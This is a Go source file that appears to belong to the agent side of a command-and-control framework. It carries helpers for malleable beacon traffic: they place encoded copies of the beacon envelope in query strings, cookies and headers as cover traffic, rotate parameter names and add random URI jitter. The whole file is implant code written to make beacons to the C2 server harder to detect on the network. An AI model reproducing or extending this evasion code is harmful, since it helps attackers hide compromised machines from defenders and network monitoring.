//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"encoding/json"
	"math/rand"
	"net/url"
	"sort"
	"strings"
)

// placementEscape percent-encodes a cookie name/value. Kept here (not in
// agent.go) because sendToC2 has a local variable named `url` shadowing the
// net/url package.
func placementEscape(s string) string {
	return url.QueryEscape(s)
}

// sortedHeaderKeys returns map keys in stable lexicographic order so beacons
// emit custom headers deterministically instead of Go's randomized map order.
func sortedHeaderKeys(m map[string]string) []string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	return keys
}

// placementSpec is one cover-copy pin: an encoded copy of the beacon envelope
// placed at a non-body location. The canonical body is unchanged, so older
// servers (or a missing placement config) keep working.
type placementSpec struct {
	Target string `json:"target"`
	Chain  string `json:"chain"`
}

// parsePlacements parses the MalleablePlacementStr JSON array. Malformed
// entries are skipped, never fatal: placements are cover traffic.
func parsePlacements(raw string) []placementSpec {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return nil
	}
	var specs []placementSpec
	if err := json.Unmarshal([]byte(raw), &specs); err != nil {
		return nil
	}
	var out []placementSpec
	for _, p := range specs {
		t := strings.TrimSpace(p.Target)
		if t == "" || strings.EqualFold(t, "body") {
			continue
		}
		kind, name := splitPlacementTarget(t)
		if kind == "" || name == "" {
			continue
		}
		out = append(out, placementSpec{Target: kind + ":" + name, Chain: p.Chain})
	}
	return out
}

func splitPlacementTarget(t string) (string, string) {
	i := strings.Index(t, ":")
	if i < 0 {
		return strings.ToLower(strings.TrimSpace(t)), ""
	}
	return strings.ToLower(strings.TrimSpace(t[:i])), strings.TrimSpace(t[i+1:])
}

// encodePlacementValue runs the placement chain over a body copy.
func encodePlacementValue(body []byte, chain string) string {
	steps := parseTransformSteps(chain)
	if len(steps) == 0 {
		return string(body)
	}
	enc, err := agentApplyTransforms(body, steps, true)
	if err != nil {
		return string(body)
	}
	return string(enc)
}

// placementQueryName rotates the query parameter name through the v2 pool
// when configured; otherwise the placement's configured name is used.
func placementQueryName(configured string) string {
	var pool []string
	for _, line := range strings.Split(ParameterNamesStr, "\n") {
		if s := strings.TrimSpace(line); s != "" {
			pool = append(pool, s)
		}
	}
	if len(pool) == 0 {
		return configured
	}
	return pool[rand.Intn(len(pool))]
}

// jitterQueryPair returns a random junk query name=value pair for URI jitter.
func jitterQueryPair() (string, string) {
	const letters = "abcdefghijklmnopqrstuvwxyz"
	name := make([]byte, 6)
	for i := range name {
		name[i] = letters[rand.Intn(len(letters))]
	}
	const hexd = "0123456789abcdef"
	val := make([]byte, 12)
	for i := range val {
		val[i] = hexd[rand.Intn(len(hexd))]
	}
	return string(name), string(val)
}

// buildPlacementValues returns cover copies for query, cookie and header
// targets. Body targets are no-ops (the canonical body already carries them).
func buildPlacementValues(body []byte) (query, cookies, headers map[string]string) {
	for _, p := range parsePlacements(MalleablePlacementStr) {
		kind, name := splitPlacementTarget(p.Target)
		val := encodePlacementValue(body, p.Chain)
		switch kind {
		case "query":
			if query == nil {
				query = map[string]string{}
			}
			query[placementQueryName(name)] = val
		case "cookie":
			if cookies == nil {
				cookies = map[string]string{}
			}
			cookies[name] = val
		case "header":
			if headers == nil {
				headers = map[string]string{}
			}
			headers[name] = val
		}
	}
	return query, cookies, headers
}
